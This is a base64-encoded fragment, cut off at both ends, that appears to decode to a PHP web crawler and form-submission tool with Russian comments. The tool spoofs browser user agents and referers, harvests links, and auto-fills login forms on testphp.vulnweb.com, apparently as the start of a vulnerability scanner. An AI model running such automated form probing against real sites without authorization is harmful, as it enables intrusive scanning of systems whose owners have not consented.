JldHVybiAkdGhpcy0+bDE7Cn0KCglwdWJsaWMgZnVuY3Rpb24gY3Jvd2xlcl9wYXJzZV91cmwoJGxpbmtzLCRwYWdlPTMpewoJCgkJCgkJCgkJCgkJaWYoJHBhZ2UgPT0wIHwgJHRoaXMtPmxpbWl0X2NyYXdsZXIgPT0wKXtyZXR1cm47fQoJCQoJCSR0aGlzLT5jcm93bGVyX3VybCA9IHN0cl9yZXBsYWNlKCdodHRwOi8vJywgJycsICR0aGlzLT5jcm93bGVyX3VybCk7CgkJJHRoaXMtPmNyb3dsZXJfdXJsMiA9IHN0cl9yZXBsYWNlKCd3d3cuJywgJycsICR0aGlzLT5jcm93bGVyX3VybCk7CgkJCgkJZm9yZWFjaCAoJGxpbmtzIGFzICRsaW5rKQoJCXsKCQkJCgkJCQoJCQkkbmV3ID0gdGltZSgpOwoJCQkkcmF6biA9ICRuZXctJHRoaXMtPnRpbWVfYWxsOwoJCQkKCQkJLy/RgdGC0L7Qv9Cw0LXQvCDQv9C10YDQtdCx0L7RgCDQtdGB0LvQuCDRgdC70LjRiNC60L7QvCDQtNC+0LvQs9C+INC40LTQtdGCCgkJCWlmKCRyYXpuPiR0aGlzLT50aW1lMil7JHRoaXMtPmQoJ1RJTUUhISEhIEFMTCcpO3JldHVybiBmYWxzZTt9CgkJCgkJCQoJCQkKCQkJJGxpbmsgPSBzdHJfcmVwbGFjZSgnYW1wOycsICcnLCAkbGluayk7CgkJCSRsaW5rID0gc3RyX3JlcGxhY2UoJy4uLy4uLycsICcnLCAkbGluayk7CgkJCSRsaW5rID0gc3RyX3JlcGxhY2UoJy4uLycsICcnLCAkbGluayk7CgkJCSRsaW5rID0gc3RyX3JlcGxhY2UoJy4vJywgJycsICRsaW5rKTsKCQkJCgkJCQoJCQkKCQkJCgkJaWYgKHByZWdfbWF0Y2goJy8oLiopLihjc3N8anBnfGdpZnxwbmd8anN8Zmx2fHN3Znxhdml8bXAzfG1wNHxtcmVnfGljb3xwbmd8anBlZyl8XiMkL3NpJywgJGxpbmspKSBjb250aW51ZTsgLy8g0L7RgtC60LjQtNGL0LLQsNC10Lwg0LvQtdCy0YvQtSDRgdGB0YvQu9C60LgKCQkJCgkJCQoJCQkKCQkJJGxpbmtfb2xkID0gJGxpbms7CgkJCSRsID0gJGxpbms7CgkJCQoJCQkkbGluayA9IHByZWdfcmVwbGFjZSgnLz0oW14mXSspL3NpJywgJz0nLCAkbGluayk7IC8vINGD0LHQuNGA0LDQtdC8INCy0YHRkSDRh9GC0L4g0L/QvtGB0LvQtSA9INC40LTQtdGCIAoJCQkKCQkJCgkJCQoJCQlpZiAoIWluX2FycmF5KCRsaW5rLCAkdGhpcy0+YTEpKQoJCQl7IAoJCQkJCgkJCQlpZigkcGFnZT09JHRoaXMtPnBhZ2UpCgkJCQl7CgkJCQkJJHRoaXMtPmQoJy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tJyk7CgkJCQl9CgkJCQkgIAoJCQkJJHRoaXMtPmQoJzw8PCAnLiRsaW5rX29sZC4iIGxpbmsgZCByYWJvdGUgcGFnZSAtICRwYWdlICIpOwoJCQkJCQkKCQkJCQoJCQkJCgkJCQkkdGhpcy0+YTFbXSA9ICRsaW5rOyAvLyDQstCw0YnQtSDRjdGC0L4g0LzQsNGB0YHQuNC6INGH0YLQvtCx0Ysg0L3QtSDQv9C+0LLRgtC+0YDRj9GC0YzRgdGPCgkJCQkvLyR0aGlzLT5kKCRsaW5rLCdsaW5rJyk7CgkJCQkkdGhpcy0+YTJbXSA9ICRsaW5rX29sZDsgLy8g0LLQsNGJ0LUg0Y3RgtC+INC80LDRgdGB0LjQuiDRh9GC0L7QsdGLINC90LUg0L/QvtCy0YLQvtGA0Y/RgtGM0YHRjwoJCQkJCgkJCQkvLyR0aGlzLT5kKCR0aGlzLT5hMSwnJHRoaXMtPmExJyk7CgkJCQlpZiAocHJlZ19tYXRjaCgnL14oaHR0cDpcL1wvfGh0dHBzOlwvXC8pPyh3d3cuKT8nLiR0aGlzLT5jcm93bGVyX3VybDIuJ1wvL3NpJywgJGwpKQoJCQkJeyAKCQkJCQkkdGhpcy0+ZCgkbCwnXihodHRwOlwvXC98aHR0cHM6XC9cLyk/KHd3dy4pPyR0aGlzLT5jcm93bGVyX3VybFwvJyk7CgkJCQl9CgkJCQllbHNlaWYocHJlZ19tYXRjaCgnL14oaHR0cDpcL1wvfGh0dHBzOlwvXC8pKyh3d3cuKT8vc2knLCAkbCkpCgkJCQl7IAoJCQkJCSR0aGlzLT5kKCRsLCcoaHR0cDpcL1wvfGh0dHBzOlwvXC8pKyh3d3cuKScpOwoJCQkJfQoJCQkJZWxzZWlmIChwcmVnX21hdGNoKCcvXlwvL3NpJywgJGwpKQoJCQkJeyAKCQkJCQkkbCA9ICR0aGlzLT5jcm93bGVyX3VybC4kbDsJCgkJCQkJJHRoaXMtPmQoJGwsJ14nKTsKCQkJCX0KCQkJCWVsc2VpZiAocHJlZ19tYXRjaCgnL15cLi9zaScsICRsKSkKCQkJCXsKCQkJCQkkbCA9IHN0cl9yZXBsYWNlKCcuLycsICcnLCAkbCk7CgkJCQkJJGwgPSAkdGhpcy0+Y3Jvd2xlcl91cmwuJy8nLiRsOwoJCQkJCSR0aGlzLT5kKCRsLCdeXC4vJyk7CgkJCQl9CgkJCQllbHNlaWYgKHByZWdfbWF0Y2goJy9eXD8vc2knLCAkbCkpCgkJCQl7IAoJCQkJCSRsID0gJHRoaXMtPmNyb3dsZXJfdXJsLiIvIi4kbDsJCgkJCQkJJHRoaXMtPmQoJGwsJ15cPycpOwoJCQkJfQoJCQkJZWxzZWlmIChwcmVnX21hdGNoKCcvXiguKilcLihodG18cGhwfGFzcHxhc3B4fGh0bWx8c2h0bWx8ZG98Y2ZtfGNnaXxwbHx0eHR8YWN0aW9ufGpzfGFzbXh8ZGh0bWx8eGh0bWx8anNwKS9zaScsICRsKSkKCQkJCXsKCQkJCQkkbCA9ICR0aGlzLT5jcm93bGVyX3VybC4nLycuJGw7CgkJCQkJJHRoaXMtPmQoJGwsJyhodG18cGhwfGFzcHxhc3B4fGh0bWx8c2h0bWx8ZG98Y2YpJyk7CgkJCQl9CgkJCQllbHNlaWYgKHByZWdfbWF0Y2goJy9eKC4qKVw/PS9zaScsICRsKSkKCQkJCXsKCQkJCQkkbCA9ICR0aGlzLT5jcm93bGVyX3VybC4nLycuJGw7CgkJCQkJJHRoaXMtPmQoJGwsJ14oLiopXD89Jyk7CgkJCQkJCgkJCQl9ZWxzZWlmIChwcmVnX21hdGNoKCcvXihbYS16LDAtOV9dKSsvc2knLCAkbCkpCgkJCQl7CgkJCQkJJGwgPSAkdGhpcy0+Y3Jvd2xlcl91cmwuJy8nLiRsOwoJCQkJCSR0aGlzLT5kKCRsLCcoW2EteiwwLTlfXC9dKScpOwoJCQkJfQoJCQkJCgkJCQoJCQkJCgkJCQkjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwoJCQkKCQkJCQoJCQkJCgkJCQkKCQkJCS8v0L3QtdC+0LHRi9GH0L3Ri9C1INC30LDQvNC10L3RiyDQv9GA0L7QuNC30LLQvtC00LjQvAoJCQkJCgkJCQkkbCA9IHN0cl9yZXBsYWNlKCIvLnBocCIsJy9waHAnLCRsKTsKCQkJCSRsID0gc3RyX3JlcGxhY2UoIi8uYXNwIiwnL2FzcCcsJGwpOwoJCQkJJGwgPSBzdHJfcmVwbGFjZSgkdGhpcy0+Y3Jvd2xlcl91cmwuIi8iLiR0aGlzLT5jcm93bGVyX3VybCwkdGhpcy0+Y3Jvd2xlcl91cmwsJGwpOwoJCQkJCgkJCQkkdGhpcy0+ZCgnIC0+Pj4gJy4kbGlua19vbGQuIigkbCkgIi4iICBsaW5rIGl0b2cgcGFnZSAtICRwYWdlIik7CgkJCQkKCQkJCS8v0LXRgdC70Lgg0LIg0LTQvtC80LXQvdC1INGB0L7QtNC10YDQtNC40YLRgdGPIGhvc3Qg0L3QviDRjdGC0L4g0LvQuNC90Log0L3QsCDRjdGC0L7QvCDRgdCw0LnRgtC1LCDQsCDQvdC1INGB0YLQvtGA0L7QvdC40LkKCQkJCWlmIChwcmVnX21hdGNoKCcvXihodHRwOlwvXC98aHR0cHM6XC9cLyk/KHd3dy4pPyguKik/Jy4kdGhpcy0+Y3Jvd2xlcl91cmwyLicvc2knLCAkbCkpCgkJCQl7CgkJCQkJCgkJCQkJCQoJCQkJCQoJCQkJCQoJCQkJCSR0aGlzLT5saW1pdF9jcmF3bGVyLS07CgkJCQkJJHRoaXMtPmQoJHRoaXMtPmxpbWl0X2NyYXdsZXIpOwoJCQkJCQoJCQkJCWlmKCR0aGlzLT5saW1pdF9jcmF3bGVyPT0wKQoJCQkJCXsKCQkJCQkJJHRoaXMtPmQoJHRoaXMtPmxpbWl0X2NyYXdsZXIsJyR0aGlzLT5saW1pdF9jcmF3bGVyIGxpbWl0IDAhIScpOwoJCQkJCQlyZXR1cm4gZmFsc2U7CgkJCQkJfQoJCQkJCQoJCQkJCQoJCQkJCWlmKHN0cnBvcygkbCwiPyIpKQoJCQkJCXsKCQkJCQkJJHRoaXMtPmQoJGwsJ2dvb2QgbCcpOwoJCQkJCQkkdGhpcy0+bDFbXSA9ICRsOy8vINC40YLQvtCz0L7QstGL0Lkg0LzQsNGB0YHQuNCyINC70LjQvdC60L7QsgoJCQkJCX0KCQkJCQkKCQkJCQkKCQkJCQkKCQkJCQkkZ2V0X2xpbmtzID0gJHRoaXMtPmdldF91cmwoJGwsdHJ1ZSk7CgkJCQkJCQoJCQkJCS8vaWYoY291bnQoJGdldF9saW5rcykgIT0wKXskdGhpcy0+ZCgkZ2V0X2xpbmtzLCdvdCBsaW5rcyAtICcuJGwuJyBwYWdlIC0gJy4kcGFnZSk7fQoJCQkJCQkJCgkJCQkJJHJlcyA9ICR0aGlzLT5jcm93bGVyX3BhcnNlX3VybCgkZ2V0X2xpbmtzLCRwYWdlLTEpOwoJCQkJCWlmKCRyZXMgPT09IGZhbHNlKXtyZXR1cm4gZmFsc2U7fQoJCQkJCQoKCQkJCX0JCgkJCQkKCQkJfQoJCQkKCQl9CgkJLy9yZXR1cm4gJHRoaXMtPmwxOwoJfQoJCglwdWJsaWMgZnVuY3Rpb24gZ2V0X3VybCgkdXJsLCRwYXJzZXI9ZmFsc2UpewoJCQoJCSR1cmwgPSBzdHJfcmVwbGFjZShhcnJheSgnaHR0cDovLycsJ2h0cHBzOi8vJyksJycsJHVybCk7CgkJJGNoID0gY3VybF9pbml0KCk7IAoJCSRoZWFkZXJzID0gYXJyYXkKCQkoCgkJCSdBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LCo7cT0wLjgnLAoJCQknQWNjZXB0LUxhbmd1YWdlOiBydSxlbi11cztxPTAuNyxlbjtxPTAuMycsCgkJCSdBY2NlcHQtQ2hhcnNldDogd2luZG93cy0xMjUxLHV0Zi04O3E9MC43LCo7cT0wLjcnCgkJKTsgCgoJCSAgICAgICR1YWdlbnQgPSBhcnJheSgKIk1vemlsbGEvNS4wIChXaW5kb3dzOyBVOyBXaW5kb3dzIE5UIDUuMTsgcnU7IHJ2OjEuOS4wLjgpIEdlY2tvLzIwMDkwMzI2MDkgRmlyZWZveC8zLjAuOCIsIk1vemlsbGEvNC4wIChjb21wYXRpYmxlOyBNU0lFIDcuMDsgV2luZG93cyBOVCA1LjE7IGRpYWwiLAkJICAKIk1vemlsbGEvNC4wIChjb21wYXRpYmxlOyBNU0lFIDcuMDsgV2luZG93cyBOVCA1LjE7IGRpYWw7IEUtbnJneVBsdXM7IC5ORVQgQ0xSIDEuMS40MzIyOyBJbmZvUGF0aC4xKSIsCiJNb3ppbGxhLzQuMCAoY29tcGF0aWJsZTsgTVNJRSA3LjA7IFdpbmRvd3MgTlQgNS4xOyBkaWFsOyBTVjE7IC5ORVQgQ0xSIDEuMC4zNzA1KSIsCiJNb3ppbGxhLzQuMCAoY29tcGF0aWJsZTsgTVNJRSA3LjA7IFdpbmRvd3MgTlQgNS4xOyBkcy02Njg0MzQxMjsgU2dydW50fFYxMDl8MXxTLTY2ODQzNDEyfGRpYWw7IC5ORVQgQ0xSIDEuMS40MzIyKSIsCiJNb3ppbGxhLzQuMCAoY29tcGF0aWJsZTsgTVNJRSA3LjA7IFdpbmRvd3MgTlQgNS4xOyBlTXVzaWMgRExNLzM7IE1TTiBPcHRpbWl6ZWQ7VVM7IE1TTiBPcHRpbWl6ZWQ7VVMpIiwKIk1vemlsbGEvNC4wIChjb21wYXRpYmxlOyBNU0lFIDcuMDsgV2luZG93cyBOVCA1LjE7IGVsZXJ0eiAyLjQuMDI1OyAuTkVUIENMUiAxLjAuMzcwNTsgLk5FVCBDTFIgMS4xLjQzMjI7IE1lZGlhIENlbnRlciBQQyA0LjApIiwKIk1vemlsbGEvNC4wIChjb21wYXRpYmxlOyBNU0lFIDcuMDsgV2luZG93cyBOVCA1LjE7IGVsZXJ0eiAyLjQuMTc5WzEyOF07IC5ORVQgQ0xSIDEuMS40MzIyOyAuTkVUIENMUiAyLjAuNTA3Mjc7IC5ORVQgQ0xSIDMuMC4wNDUwNi4zMDsgLk5FVCBDTFIgMy4wLjA0NTA2LjY0OCkiLAoiTW96aWxsYS80LjAgKGNvbXBhdGlibGU7IE1TSUUgNy4wOyBXaW5kb3dzIE5UIDUuMTsgZ2VuZXJpY18wMV8wMTsgSW5mb1BhdGguMSkiLAoiTW96aWxsYS80LjAgKGNvbXBhdGlibGU7IE1TSUUgNy4wOyBXaW5kb3dzIE5UIDUuMTsgZ2VuZXJpY18wMV8wMTsgWVBDIDMuMi4wOyAuTkVUIENMUiAxLjEuNDMyMjsgeXBsdXMgNS4zLjA0YikiLAoiTW96aWxsYS80LjAgKGNvbXBhdGlibGU7IE1TSUUgNy4wOyBXaW5kb3dzIE5UIDUuMTsgaU9wdXMtSS1NOyAuTkVUIENMUiAxLjEuNDMyMikiLAoiTW96aWxsYS80LjAgKGNvbXBhdGlibGU7IE1TSUUgNy4wOyBXaW5kb3dzIE5UIDUuMTsgaWViYXIpIiwKIk1vemlsbGEvNC4wIChjb21wYXRpYmxlOyBNU0lFIDcuMDsgV2luZG93cyBOVCA1LjE7IGllYmFyOyBJbmZvUGF0aC4yOyAuTkVUIENMUiAxLjEuNDMyMjsgLk5FVCBDTFIgMi4wLjUwNzI3OyAuTkVUIENMUiAzLjAuMDQ1MDYuMzApIiwKIk1vemlsbGEvNC4wIChjb21wYXRpYmxlOyBNU0lFIDcuMDsgV2luZG93cyBOVCA1LjE7IGllYmFyOyBTZ3J1bnR8VjEwOXwxNzQ2fFMtMTc0MDUzMjkzNHxkaWFsbm87IHNucHJ0enxkaWFsbm87IC5ORVQgQ0xSIDIuMC41MDcyNykiLAoiTW96aWxsYS80LjAgKGNvbXBhdGlibGU7IE1TSUUgNy4wOyBXaW5kb3dzIE5UIDUuMTsgaWViYXI7IGFjYz07IFlQQyAzLjIuMDsgLk5FVCBDTFIgMS4wLjM3MDU7IC5ORVQgQ0xSIDEuMS40MzIyOyBJRU1CMzsgSUVNQjM7IHlwbHVzIDUuMS4wNGIpIiwKIk1vemlsbGEvNC4wIChjb21wYXRpYmxlOyBNU0lFIDcuMDsgV2luZG93cyBOVCA1LjE7IGllYmFyOyBhY2M9bm9uZTsgRnVuV2ViUHJvZHVjdHM7IC5ORVQgQ0xSIDEuMS40MzIyKSIsCiJNb3ppbGxhLzQuMCAoY29tcGF0aWJsZTsgTVNJRSA3LjA7IFdpbmRvd3MgTlQgNS4xOyBpZWJhcjsgYWNjPW5vbmU7IFNWMTsgc25wcnR6fFMwNDA4NzU0NDgwMjEzNzsgLk5FVCBDTFIgMS4xLjQzMjIpIiwKIk1vemlsbGEvNC4wIChjb21wYXRpYmxlOyBNU0lFIDcuMDsgV2luZG93cyBOVCA1LjE7IGllYmFyOyB5cGx1cyA1LjYuMDJiKSIpOwoJCQoJCSAgLy8v0YDQsNC90LTQvtC80L3Ri9C1INC30L3QsNGH0LXQvdC40Y8KCQkKCQkgICR1YSA9IHRyaW0oJHVhZ2VudFttdF9yYW5kKDAsc2l6ZW9mKCR1YWdlbnQpLTEpXSk7CQoJCQoJCWlmKCR0aGlzLT5odHRwcykKCQl7CgkJCSR1cmxfbmV3ID0gJ2h0dHBzOi8vJy4kdXJsOwoJCX1lbHNlCgkJewoJCQkkdXJsX25ldyA9ICdodHRwOi8vJy4kdXJsOwoJCX0KCQkKCQkKCQljdXJsX3NldG9wdCggJGNoLCBDVVJMT1BUX0hUVFBIRUFERVIsJGhlYWRlcnMpOyAKCQljdXJsX3NldG9wdCAoJGNoLCBDVVJMT1BUX1VSTCwkdXJsX25ldyk7CgkJY3VybF9zZXRvcHQgKCRjaCwgQ1VSTE9QVF9IRUFERVIsIDEpOwoJCWN1cmxfc2V0b3B0ICgkY2gsIENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsIDEpOyAKCQljdXJsX3NldG9wdCAoJGNoLCBDVVJMT1BUX0ZPTExPV0xPQ0FUSU9OLCAxKTsKCQljdXJsX3NldG9wdCAoJGNoLCBDVVJMT1BUX0ZBSUxPTkVSUk9SLCAxKTsgLy8gRmFpbCBvbiBlcnJvcnMKCQljdXJsX3NldG9wdCAoJGNoLCBDVVJMT1BUX0NPTk5FQ1RUSU1FT1VULCAyMCk7CgkJY3VybF9zZXRvcHQgKCRjaCwgQ1VSTE9QVF9SRUZFUkVSLCAiaHR0cDovL2dvb2dsZS5jb20iKTsKCQljdXJsX3NldG9wdCAoJGNoLCBDVVJMT1BUX1VTRVJBR0VOVCwgJHVhKTsKCQljdXJsX3NldG9wdCAoJGNoLCBDVVJMT1BUX0NPT0tJRUZJTEUsICdjb28udHh0Jyk7IAoJCWN1cmxfc2V0b3B0ICgkY2gsIENVUkxPUFRfQ09PS0lFSkFSLCAnY29vLnR4dCcpOyAKCQkkY29uID0gY3VybF9leGVjKCRjaCk7IAoJCQoJCWN1cmxfY2xvc2UgKCRjaCk7CgkJCgkJLy8kdGhpcy0+ZCgkY29uLCckY29uJyk7CgkJLy9leGl0OwoJCQoJCQoJCWlmKCRwYXJzZXIpeyR0aGlzLT5mb3JtX3NlYXJjaCgkY29uLCR1cmwpO30KCQkKCQlpZigkdGhpcy0+c2l0ZW1hcD09dHJ1ZSkKCQl7CgkJCQoJCQlwcmVnX21hdGNoX2FsbCgnLzxsb2M+KC4qPyk8XC9sb2M+L3NpJywgJGNvbiwgJGxpbmtzKTsgLy/RgNCw0LfQtNC10LvQuNGC0LXQu9GMICIKCQkJJGdldF9saW5rcyA9ICRsaW5rc1sxXTsKCQl9ZWxzZQoJCXsKCQkJcHJlZ19tYXRjaF9hbGwoJy9ocmVmPSIoW14iXSspL3NpJywgJGNvbiwgJGxpbmtzKTsgLy/RgNCw0LfQtNC10LvQuNGC0LXQu9GMICIKCQkJcHJlZ19tYXRjaF9hbGwoJy9ocmVmPVwnKFteXCddKykvc2knLCAkY29uLCAkbGlua3MyKTsgLy/RgNCw0LfQtNC10LvQuNGC0LXQu9GMICcKCQkJJGdldF9saW5rcyA9IGFycmF5X21lcmdlKCRsaW5rczJbMV0sICRsaW5rc1sxXSk7CgkJCQoJCX0KCQkKCQkvLyR0aGlzLT5kKCRsaW5rcywnJGxpbmtzJyk7CgkJLy8kdGhpcy0+ZCgkbGlua3MyLCckbGlua3MyJyk7CgoJCQoJCSRnZXRfbGlua3MgPSBhcnJheV91bmlxdWUoJGdldF9saW5rcyk7Ly8g0LTRg9Cx0LvQuCDRg9C00LDQu9GP0LXQvAoJCQoJCQoJCQoJCXVuc2V0KCRjb24pOwoJCXVuc2V0KCRnZXRfbGlua3NbYXJyYXlfc2VhcmNoKCcjJywgJGdldF9saW5rcyldKTsKCQkKCQlyZXR1cm4gJGdldF9saW5rczsKCX0KCQoJcHVibGljIGZ1bmN0aW9uIGZvcm1fc3RhcnQoJHVybCl7CgkJCgkJJHRoaXMtPnBvc3RfZW5hYmxlID0gdHJ1ZTsgLy/QstC60LvRjtGH0LDQtdC8INGA0LDQsdC+0YLRgyDRgSDRhNC+0YDQvNCw0LzQuAoJCQoJCSR1cmwgPSAnaHR0cDovL3Rlc3RwaHAudnVsbndlYi5jb20vbG9naW4ucGhwJzsKCQkKCQkvL9C/0L7Qu9GD0YfQsNC10Lwg0YHRgtGA0LDQvdC40YbRgyDQs9C00LUg0YTQvtGA0LzRiyDQvdCw0YXQvtC00Y/RgtGM0YHRjywg0L7QsdGL0YfQvdCw0Y8g0LfQsNCz0YDRg9C30LrQsCDRgdGC0YDQsNC90LjRhtGLCgkJJGNvbiA9ICR0aGlzLT5mb3JtX3BhZ2VfdXJsKCR1cmwpOwoJCSR0aGlzLT5mb3JtX3NldFsnZm9ybV9wYWdlX2RlZmF1bHQnXSA9ICR0aGlzLT5maWx0ZXJfdXJsKCR1cmwpOwoJCS8vJHRoaXMtPmQoJGNvbiwnJHRoaXMtPmZvcm1fY29uJyk7CgkJLy9leGl0OwoJCQoJCSRmb3JtcyA9ICR0aGlzLT5mb3JtX3NlYXJjaCgkY29uKTsvL9C40YnQtdC8INGE0L7RgNC80Ysg0L3QsCDRgdGC0YDQsNC90LjRhtC1LCDQvdCw0YXQvtC00LjRgiDQsiDRh9GD0YLQvtC6INC60YDQuNCy0L7QvCDQstCw0YDQuNC10L3RgtC1CgkJJHRoaXMtPmZvcm1fc2V0Wydmb3JtcyddID0gJGZvcm1zOwoJCSR0aGlzLT5kKCRmb3JtcywnJGZvcm1zJyk7CgkJZXhpdDsKCQoJCSRmb3JtX3Bvc3RfZGF0YSAgPSAkdGhpcy0+Zm9ybV9wb3N0X2RhdGEoJGZvcm1zKTsvLyDRgNC10LTQsNC60YLQuNGA0YPQtdC8INC/0L7RgdGCINGE0L7RgNC80LDRgiDQv9C+0LQg0YHQtdCx0Y8KCQkkdGhpcy0+Zm9ybV9zZXRbJ2Zvcm1fcG9zdF9kYXRhJ10gPSAkZm9ybV9wb3N0X2RhdGE7CgkJLy8kdGhpcy0+ZCgkZm9ybV9wb3N0X2RhdGEsJyRmb3JtX3Bvc3RfZGF0YScpOwoJCQoJCSRmb3JtX3Bvc3RfcXVlcnkgPSAkdGhpcy0+Zm9ybV9wb3N0X3F1ZXJ5KCRmb3JtX3Bvc3RfZGF0YSk7Ly/Rh9C40YHRgtCw0Y8gcXVlcnkg0YHRgtGA0L7QutCwCgkJJHRoaXMtPmZvcm1fc2V0Wydmb3JtX3Bvc3RfcXVlcnknXSA9ICRmb3JtX3Bvc3RfcXVlcnk7CgkJLy8kdGhpcy0+ZCgkZm9ybV9wb3N0X3F1ZXJ5LCckZm9ybV9wb3N0X3F1ZXJ5Jyk7CgkJCgkJCgkJJGZvcm1fcGFnZV9mdWxsX3F1ZXJ5ID0gJHRoaXMtPmZvcm1fcGFnZV9mdWxsX3F1ZXJ5KCRhY3QsJGZvcm1fcG9zdF9xdWVyeSk7CgkJJHRoaXMtPmZvcm1fc2V0Wydmb3JtX3BhZ2VfZnVsbF9xdWVyeSddID0gJGZvcm1fcGFnZV9mdWxsX3F1ZXJ5OwoJCS8vJHRoaXMtPmQoJGZvcm1fcGFnZV9mdWxsX3F1ZXJ5LCdmb3JtX3BhZ2VfZnVsbF9xdWVyeScpOwoJCQoJfQoJCglwdWJsaWMgZnVuY3Rpb24gZm9ybV9wb3N0X2RhdGEoJGZvcm1zKXsvL9C80LDRgdGB0LjQsiDQv9C+0YHRggoJCQoJCQoJCQoJCWlmKGNvdW50KCRmb3Jtcyk+MCkKCQl7CgkJCQkKCQkJCWZvcmVhY2goJGZvcm1zIGFzICRmb3JtX29uZSkKCQkJCXsKCQkJCQkkZm9ybV9vbmUgPSAkZm9ybV9vbmVbMF07CgkJCQkJLy8kdGhpcy0+ZCgkZm9ybV9vbmUsJyRmb3JtX29uZScpOwoJCQkJCS8vZXhpdDsKCQkJCQkKCQkJCQkKCQkJCQkkYWN0ID0gJGZvcm1fb25lWyJmb3JtX2RhdGEiXVsiYWN0aW9uIl07CgkJCQkJJGFjdCA9IHN0cl9yZXBsYWNlKCdodHRwOi8vJywgJycsICRhY3QpOwoJCQkJCSRhY3QgPSBzdHJfcmVwbGFjZSgnaHR0cHM6Ly8nLCAnJywgJGFjdCk7CgkJCQkJJGFjdCA9IHN0cl9yZXBsYWNlKCdhbXA7JywgJycsICRhY3QpOwoJCQkJCSRhY3QgPSBzdHJfcmVwbGFjZSgnLi4vLi4vJywgJycsICRhY3QpOwoJCQkJCSRhY3QgPSBzdHJfcmVwbGFjZSgnLi4vJywgJycsICRhY3QpOwoJCQkJCSRhY3QgPSBzdHJfcmVwbGFjZSgnLi8nLCAnJywgJGFjdCk7CgkJCQkJCgkJCQkJCgkJCQkJJHRoaXMtPmQoJGFjdCwnJGFjdCcpOwoJCQkJCQoJCQkJCWlmIChwcmVnX21hdGNoKCcvJy4kdGhpcy0+Zm9ybV9ob3N0Licvc2knLCAkYWN0KSkKCQkJCQl7CgkJCQkJCSRuZXdfYWN0ID0gJGFjdDsKCQkJCQl9ZWxzZXsKCQkJCQkJaWYoJGFjdHswfT09Jy8nKXskbmV3X2FjdCA9ICR0aGlzLT5mb3JtX2hvc3QuJGFjdDt9ZWxzZXskbmV3X2FjdCA9ICR0aGlzLT5mb3JtX2hvc3QuJycuJGFjdDt9CgkJCQkJCQoJCQkJCQkKCQkJCQl9CgkJCQkJCgkJCQkJJHRoaXMtPmQoJG5ld19hY3QsJyRuZXdfYWN0Jyk7CgkJCQkJCgkJCQkJJHRoaXMtPmZvcm1fc2V0Wydmb3JtX3BhZ2VfYWN0J10gPSAkbmV3X2FjdDsKCQkJCQkKCQkJCQoJCQkJCQoJCQkJCWZvcmVhY2goJGZvcm1fb25lWyJidXR0b25zIl0gYXMgJGJiYil7CgkJCQkJCQoJCQkJCQkkYmJiX25ld1skYmJiWyduYW1lJ11dPSRiYmI7CgkJCQkJCQoJCQkJCX0KCQkJCQkKCQkJCQkvLyR0aGlzLT5kKCRiYmJfbmV3LCckYmJiX25ldycpOwoJCQkJCS8vZXhpdDsKCQkJCQoJCQkJCSR0bXBhbGwgPSBhcnJheV9tZXJnZSgkZm9ybV9vbmVbImZvcm1fZWxlbWV0cyJdLCRiYmJfbmV3KTsKCQkJCQkKCQkJCQkkZm9ybV9wb3N0X2RhdGEgPSAkdG1wYWxsOwoJCQkJCQoJCQkJCQoJCQkJCQoJCQkJCQoJCQkJfQoJCQkJCgkJCQlyZXR1cm4gJGZvcm1fcG9zdF9kYXRhOwoJCQkJCQkKCQkJCQkKCQl9ZWxzZQoJCXsKCQkJcmV0dXJuIGZhbHNlOwoJCX0JCQkKCQoJfQoJCglwdWJsaWMgZnVuY3Rpb24gZm9ybV9wb3N0X3F1ZXJ5KCRwb3N0ZGF0YSl7IC8v0KfQuNGB0YLQviDQutCy0LXRgNC4CgkJCgkJCgkJLy9leGl0OwoJCQoJCSRzdHI9Jyc7CgkJCgkJZm9yZWFjaCgkcG9zdGRhdGEgYXMgJHBwPT4kdmFsdWUpCgkJewoJCQkKCQkJCS8vJHRoaXMtPmQoJHZhbHVlLCckdmFsdWUnKTsKCQkKCQkJCgoJCQkJCgkKCQkJCWlmKCR2YWx1ZVsndHlwZSddPT0nc3VibWl0JykKCQkJCXsKCQkJCQlpZigkdmFsdWVbJ25hbWUnXSAhPScnKXsKCQkJCQkJaWYoJHBwICE9JycpeyRzdHIuPSRwcC4nPScuJHZhbHVlWyd2YWx1ZSddLiImIjt9ZWxzZXskc3RyLj0kdmFsdWVbJ25hbWUnXS4nPScuJHZhbHVlWyd2YWx1ZSddLiImIjt9CgkJCQkJCQoJCQkJCX1lbHNlewoJCQkJCQlpZigkcHAgIT0nJyl7JHN0ci49JHBwLic9Jy4kdmFsdWVbJ3ZhbHVlJ10uIiYiO31lbHNleyRzdHIuPSR2YWx1ZVsndmFsdWUnXS4nPScuJHZhbHVlWyd2YWx1ZSddLiImIjt9CgkJCQkJCQoJCQkJCQoJCQkJCX0KCQkJCQkKCQkJCX1lbHNlCgkJCQl7CgkJCQkJLy8kdGhpcy0+ZCgkcHAsJyRwcCcpOwoJCQkJCQoJCQkJCWlmKHByZWdfbWF0Y2goJy9uYW1lL2knLCRwcCwkbWF0aCkpCgkJCQkJewoJCQkJCQkkciA9ICR0aGlzLT5zdHJfcmFuZCgpOwoJCQkJCQkkc3RyLj0kcHAuJz1UZXJsaW1wb3BvaycuJHIuJyYnOwoJCQkJCX0KCQkJCQllbHNlaWYocHJlZ19tYXRjaCgnL05hY2huYS9pJywkcHAsJG1hdGgpKQoJCQkJCXsKCQkJCQkJJHIgPSAkdGhpcy0+c3RyX3JhbmQoKTsKCQkJCQkJJHN0ci49JHBwLic9VGVybGltcG9wb2snLiRyLicmJzsKCQkJCQl9CgkJCQkJZWxzZWlmKHByZWdfbWF0Y2goJy9zdXJuYS9pJywkcHAsJG1hdGgpKQoJCQkJCXsKCQkJCQkJJHIgPSAkdGhpcy0+c3RyX3JhbmQoKTsKCQkJCQkJJHN0ci49JHBwLic9VGVybGltcG9wb2snLiRyLicmJzsKCQkJCQl9CgkJCQkJZWxzZWlmKHByZWdfbWF0Y2goJy91c2VyL2knLCRwcCwkbWF0aCkpCgkJCQkJewoJCQkJCQkkciA9ICR0aGlzLT5zdHJfcmFuZCgpOwoJCQkJCQkkc3RyLj0kcHAuJz1UZXJsaW1wb3Bva3VzZXInLiRyLicmJzsKCQkJCQl9CgkJCQkJZWxzZWlmKHByZWdfbWF0Y2goJy9wYXNzL2knLCRwcCwkbWF0aCkpCgkJCQkJewoJCQkJCQkkciA9ICR0aGl